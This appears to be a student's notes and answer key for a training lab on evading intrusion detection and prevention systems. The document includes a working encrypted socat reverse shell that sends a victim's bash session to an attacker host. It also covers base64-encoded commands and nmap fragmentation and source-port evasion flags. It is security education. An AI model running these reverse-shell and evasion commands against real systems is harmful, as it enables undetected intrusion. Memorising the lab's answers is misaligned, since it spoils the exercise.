# Network Security Solutions - Medium

1. [Introduction](#introduction)
2. [IDS Engine Types](#ids-engine-types)
3. [IDS/IPS Rule Triggering](#idsips-rule-triggering)
4. [Evasion via Protocol Manipulation](#evasion-via-protocol-manipulation)
5. [Evasion via Payload Manipulation](#evasion-via-payload-manipulation)
6. [Evasion via Route Manipulation](#evasion-via-route-manipulation)
7. [Evasion via Tactical DoS](#evasion-via-tactical-dos)
8. [C2 and IDS/IPS Evasion](#c2-and-idsips-evasion)
9. [Next-Gen Security](#next-gen-security)

## Introduction

* IDS (Intrusion Detection System) - detects network/system intrusions.

* IPS (Intrusion Prevention System) - can detect and prevent intrusions.

* IDS setups can be categorised based on their location in the network into:

  * HIDS (Host-based IDS) - installed on an OS along with other apps; HIDS monitors traffic going in and out of the host.

  * NIDS (Network-based IDS) - dedicated app/server to monitor network traffic; usually connected to a monitor port on the switch.

```markdown
1. What does an IPS stand for? - Intrusion Prevention System

2. What do you call a system that can detect malicious activity but not stop it? - Intrusion Detection System
```

## IDS Engine Types

* Network traffic can be either benign (usual) or malicious (abnormal); the latter should be picked up by the IDS.

* Detection engine of an IDS can be:

  * Signature-based - needs full knowledge of malicious traffic; using explicit rules to match against.

  * Anomaly-based - needs knowledge of what regular traffic is like; using machine learning or manual rules.

```markdown
1. What kind of IDS engine has a database of all known malicious packets’ contents? - Signature-based

2. What kind of IDS engine needs to learn what normal traffic looks like instead of malicious traffic? - Anomaly-based

3. What kind of IDS engine needs to be updated constantly as new malicious packets and activities are discovered? - Signature-based
```

## IDS/IPS Rule Triggering

```markdown
1. What is the IP address running the port scan? - 10.14.17.226
```

## Evasion via Protocol Manipulation

* Evasion via protocol manipulation includes:

  * Relying on a different protocol
  * Manipulating (source) TCP/UDP port
  * Using session splicing (IP packet fragmentation)
  * Sending invalid packets

```markdown
1. We use the following Nmap command, nmap -sU -F 10.10.30.17, to launch a UDP scan against our target. What is the option we need to add to set the source port to 161? - -g 161

2. Using ncat, how do we set a listener on the Telnet port? - ncat -lvnp 23

3. We are scanning our target using nmap -sS -F 10.10.30.17. We want to fragment the IP packets used in our Nmap scan so that the data size does not exceed 16 bytes. What is the option that we need to add? - -ff

4. Which of the above three arguments would return meaningful results when scanning MACHINE_IP? - -sF

5. What is the option in hping3 to set a custom TCP window size? - -w
```

## Evasion via Payload Manipulation

* Evasion via payload manipulation includes:

  * Obfuscating and encoding payload
  * Encrypting communication channel
  * Modifying shellcode

```shell
#for encrypting communication channel

#we need to create key on attacker machine
openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
#this gives thm-reverse.key and thm-reverse.crt

#create .pem file
cat thm-reverse.key thm-reverse.crt > thm-reverse.pem

#start listening while using key for encrypting communication
socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT

#on victim machine
socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash
#from here on, the packet data will be encrypted
#IPS cannot read encrypted data
```

```shell
echo "cat /etc/passwd" > b64.txt

base64 b64.txt
#encodes command to base64
```

```markdown
1. Using base64 encoding, what is the transformation of cat /etc/passwd? - Y2F0IC9ldGMvcGFzc3dkCg==

2. The base32 encoding of a particular string is NZRWC5BAFVWCAOBQHAYAU===. What is the original string? - ncat -l 8080

3. You created a certificate, which we gave the extension .crt, and a private key, which we gave the extension .key. What is the first line in the certificate file? - -----BEGIN CERTIFICATE-----

4. What is the last line in the private key file? - -----END PRIVATE KEY-----

5. Once you connect to the bind shell using ncat MACHINE_IP 1234, find the user’s name. - redteamnetsec
```

## Evasion via Route Manipulation

* Evasion via route manipulation includes:

  * Relying on source routing
  * Using proxy servers

```markdown
1. Which protocols are currently supported by Nmap? - HTTP, SOCKS4
```

## Evasion via Tactical DoS

* Evasion via tactical DoS includes:

  * Launching denial of service against IDS/IPS
  * Launching denial of service against logging server

## C2 and IDS/IPS Evasion

* Pentesting frameworks (Cobalt Strike, Empire) offer malleable C2 (Command & Control) profiles; these allow fine-tuning to evade IDS/IPS systems.

```markdown
1. Which variable would you modify to add a random sleep time between beacon check-ins? - Jitter
```

## Next-Gen Security

* Characteristics of next-gen IPS (NGNIPS):

  * Standard first-gen IPS capabilities
  * Application awareness and full-stack visibility
  * Context awareness
  * Content awareness
  * Agile engine
